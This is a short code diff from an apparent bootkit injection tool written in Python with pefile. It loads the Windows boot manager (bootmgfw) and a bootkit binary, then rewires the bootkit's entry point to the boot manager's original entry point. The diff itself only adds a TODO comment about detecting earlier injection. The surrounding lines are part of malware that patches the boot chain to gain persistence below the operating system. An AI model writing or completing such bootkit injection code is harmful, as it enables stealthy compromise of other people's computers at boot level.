@@ -20,6 +20,7 @@ def main():
 
     pe = pefile.PE(bootmgfw_file)
     bootkit_pe = pefile.PE(bootkit_file)
+    # TODO: verify that we didn't already inject here (perhaps implement re-injection?)
     bootkit_entry_rva = bootkit_pe.OPTIONAL_HEADER.AddressOfEntryPoint
     # Put the original bootmgfw entry point in the bootkit entry point
     bootkit_pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint
